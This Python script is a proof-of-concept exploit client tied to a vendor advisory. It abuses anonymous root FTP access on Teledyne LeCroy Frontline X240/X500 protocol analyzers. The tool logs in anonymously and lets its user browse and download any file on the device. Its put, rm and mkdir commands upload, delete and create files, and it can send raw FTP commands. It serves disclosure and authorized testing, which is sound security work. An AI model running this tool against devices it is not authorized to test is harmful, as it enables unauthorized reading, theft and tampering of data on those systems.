#!/usr/bin/env python3
# SPDX-License-Identifier: GPL-3.0-only
"""
x240_ftp_shell.py: Interactive anonymous-FTP browser for the X240.

Target  : Teledyne LeCroy Frontline X240 / X240i / X500 / X500e
Finding : Anonymous FTP as root (TCP/21)
Advisory: TDY-PSG-2026-001 (CVE pending)
Author  : Erwin Karincic (Dollarhyde)

Authorized testing only. Use against equipment you own or are explicitly permitted to test.

Usage:
    python x240_ftp_shell.py [host]          # default 10.10.0.240

Commands (type 'help' for the full list):
    ls / cd / pwd / cat / head / xxd / stat
    get / put / rm / mkdir      (put/rm/mkdir are writability tests)
    find / tree / raw / reconnect / !<cmd> / exit
"""

import ftplib
import sys
import cmd
import os
import shlex
import subprocess
import io
import posixpath


HOST = sys.argv[1] if len(sys.argv) > 1 else "10.10.0.240"


def normpath(p):
    n = posixpath.normpath(p)
    return n if n else "/"


class X240Shell(cmd.Cmd):
    intro = ""

    def __init__(self, host):
        super().__init__()
        self.host = host
        self.cwd = "/"
        self.ftp = None
        self._connect()

    def _connect(self):
        self.ftp = ftplib.FTP(self.host, timeout=30)
        self.ftp.login("anonymous", "anonymous@")
        try:
            self.ftp.sendcmd("TYPE I")
        except ftplib.all_errors:
            pass
        try:
            self.ftp.cwd(self.cwd)
        except ftplib.all_errors:
            self.cwd = "/"
        self._update_prompt()
        print(f"Connected to {self.host}")
        print(f"Banner: {self.ftp.welcome.strip()}")
        print("Type 'help' for commands.\n")

    def _update_prompt(self):
        self.prompt = f"x240:{self.cwd}$ "

    def _resolve(self, path):
        if not path:
            return self.cwd
        if path.startswith("/"):
            return normpath(path)
        return normpath(posixpath.join(self.cwd, path))

    def emptyline(self):
        pass

    def default(self, line):
        print("Unknown command. Type 'help'.")

    def _retr_bytes(self, path, limit=None):
        buf = io.BytesIO()
        done = [False]
        def writer(chunk):
            if done[0]:
                return
            if limit is not None and buf.tell() + len(chunk) >= limit:
                buf.write(chunk[: limit - buf.tell()])
                done[0] = True
                return
            buf.write(chunk)
        try:
            self.ftp.retrbinary(f"RETR {path}", writer)
        except ftplib.error_temp:
            pass  # control-channel hiccup after a short read; we have the bytes
        return buf.getvalue()

    def _list(self, path):
        lines = []
        self.ftp.retrlines(f"LIST {path}", lines.append)
        return lines

    def do_ls(self, arg):
        """ls [path]   List directory."""
        target = self._resolve(arg.strip())
        try:
            for line in self._list(target):
                print(line)
        except ftplib.all_errors as e:
            print(f"ls: {e}")

    def do_cd(self, arg):
        """cd <path>   Change directory."""
        if not arg.strip():
            print(self.cwd); return
        target = self._resolve(arg.strip())
        try:
            self.ftp.cwd(target)
            self.cwd = target
            self._update_prompt()
        except ftplib.all_errors as e:
            print(f"cd: {e}")

    def do_pwd(self, arg):
        """pwd   Print working directory."""
        print(self.cwd)

    def do_cat(self, arg):
        """cat <file>   Display file as text."""
        if not arg.strip():
            print("Usage: cat <file>"); return
        target = self._resolve(arg.strip())
        try:
            data = self._retr_bytes(target)
        except ftplib.all_errors as e:
            print(f"cat: {e}"); return
        sys.stdout.write(data.decode("utf-8", errors="replace"))
        if data and not data.endswith(b"\n"):
            print()

    def do_head(self, arg):
        """head <file> [lines]   First N lines (default 20)."""
        parts = shlex.split(arg)
        if not parts:
            print("Usage: head <file> [lines]"); return
        target = self._resolve(parts[0])
        n = int(parts[1]) if len(parts) > 1 else 20
        try:
            data = self._retr_bytes(target, limit=128 * 1024)
        except ftplib.all_errors as e:
            print(f"head: {e}"); return
        for line in data.decode("utf-8", errors="replace").splitlines()[:n]:
            print(line)

    def do_xxd(self, arg):
        """xxd <file> [bytes]   Hex dump (default 256 bytes)."""
        parts = shlex.split(arg)
        if not parts:
            print("Usage: xxd <file> [bytes]"); return
        target = self._resolve(parts[0])
        n = int(parts[1]) if len(parts) > 1 else 256
        try:
            data = self._retr_bytes(target, limit=n)
        except ftplib.all_errors as e:
            print(f"xxd: {e}"); return
        for off in range(0, len(data), 16):
            chunk = data[off:off + 16]
            hex_part = " ".join(f"{b:02x}" for b in chunk).ljust(16 * 3 - 1)
            asc_part = "".join(chr(b) if 32 <= b < 127 else "." for b in chunk)
            print(f"{off:08x}  {hex_part}  |{asc_part}|")

    def do_stat(self, arg):
        """stat <path>   Show size / mtime / perms."""
        target = self._resolve(arg.strip())
        try:
            print(f"  size: {self.ftp.size(target)}")
        except ftplib.all_errors as e:
            print(f"  size: ({e})")
        try:
            print(f"  MDTM: {self.ftp.sendcmd(f'MDTM {target}')}")
        except ftplib.all_errors as e:
            print(f"  MDTM: ({e})")
        try:
            for line in self._list(target):
                print(f"  LIST: {line}")
        except ftplib.all_errors as e:
            print(f"  LIST: ({e})")

    def do_get(self, arg):
        """get <remote> [local]   Download."""
        parts = shlex.split(arg)
        if not parts:
            print("Usage: get <remote> [local]"); return
        remote = self._resolve(parts[0])
        local = parts[1] if len(parts) > 1 else os.path.basename(remote)
        try:
            with open(local, "wb") as f:
                self.ftp.retrbinary(f"RETR {remote}", f.write)
            print(f"Saved {os.path.getsize(local)} bytes to {local}")
        except ftplib.all_errors as e:
            print(f"get: {e}")

    def do_put(self, arg):
        """put <local> [remote]   Upload (writability test)."""
        parts = shlex.split(arg)
        if not parts:
            print("Usage: put <local> [remote]"); return
        local = parts[0]
        remote = self._resolve(parts[1] if len(parts) > 1 else os.path.basename(local))
        try:
            with open(local, "rb") as f:
                self.ftp.storbinary(f"STOR {remote}", f)
            print(f"Uploaded {local} -> {remote}")
        except ftplib.all_errors as e:
            print(f"put: {e}")

    def do_rm(self, arg):
        """rm <path>   Delete (writability test)."""
        if not arg.strip():
            print("Usage: rm <path>"); return
        try:
            self.ftp.delete(self._resolve(arg.strip()))
            print("Deleted.")
        except ftplib.all_errors as e:
            print(f"rm: {e}")

    def do_mkdir(self, arg):
        """mkdir <path>   Create dir (writability test)."""
        if not arg.strip():
            print("Usage: mkdir <path>"); return
        try:
            self.ftp.mkd(self._resolve(arg.strip()))
            print("Created.")
        except ftplib.all_errors as e:
            print(f"mkdir: {e}")

    def do_find(self, arg):
        """find <pattern>   Recursive search by name substring."""
        if not arg.strip():
            print("Usage: find <pattern>"); return
        pattern = arg.strip().lower()
        skip = ("/proc", "/sys", "/dev")
        def walk(path, depth=0):
            if depth > 10 or any(path.startswith(s) for s in skip):
                return
            try:
                lines = self._list(path)
            except ftplib.all_errors:
                return
            for line in lines:
                parts = line.split(None, 8)
                if len(parts) < 9:
                    continue
                ftype = parts[0][0]
                name = parts[8].split(" -> ")[0]
                if name in (".", ".."):
                    continue
                full = posixpath.join(path, name)
                if pattern in name.lower():
                    print(f"  {full}")
                if ftype == "d":
                    walk(full, depth + 1)
        walk(self.cwd)

    def do_tree(self, arg):
        """tree [path] [depth]   Tree view (default depth 3)."""
        parts = shlex.split(arg)
        path = self._resolve(parts[0]) if parts else self.cwd
        max_depth = int(parts[1]) if len(parts) > 1 else 3
        skip = ("/proc", "/sys", "/dev")
        print(path)
        def walk(p, depth=0, prefix=""):
            if depth >= max_depth or any(p.startswith(s) for s in skip):
                return
            try:
                lines = self._list(p)
            except ftplib.all_errors:
                return
            entries = []
            for line in lines:
                pp = line.split(None, 8)
                if len(pp) < 9:
                    continue
                name = pp[8].split(" -> ")[0]
                if name in (".", ".."):
                    continue
                entries.append((pp[0][0], name))
            for i, (ftype, name) in enumerate(entries):
                last = (i == len(entries) - 1)
                conn = "└── " if last else "├── "
                print(f"{prefix}{conn}{name}{'/' if ftype == 'd' else ''}")
                if ftype == "d":
                    walk(posixpath.join(p, name), depth + 1,
                         prefix + ("    " if last else "│   "))
        walk(path)

    def do_raw(self, arg):
        """raw <ftp-cmd>   Send raw FTP command."""
        if not arg.strip():
            print("Usage: raw <cmd>"); return
        try:
            print(self.ftp.sendcmd(arg))
        except ftplib.all_errors as e:
            print(f"raw: {e}")

    def do_reconnect(self, arg):
        """reconnect   Drop and reopen the session."""
        try:
            self.ftp.quit()
        except Exception:
            pass
        self._connect()

    def do_shell(self, arg):
        """!<cmd>   Run a local shell command."""
        subprocess.call(arg, shell=True)

    def do_exit(self, arg):
        """exit   Quit."""
        return True

    do_quit = do_exit
    do_EOF = do_exit


def main():
    print(f"Connecting to {HOST} ...")
    try:
        shell = X240Shell(HOST)
    except ftplib.all_errors as e:
        print(f"Connect failed: {e}")
        sys.exit(1)
    try:
        shell.cmdloop()
    except KeyboardInterrupt:
        print()
    finally:
        try:
            shell.ftp.quit()
        except Exception:
            pass


if __name__ == "__main__":
    main()
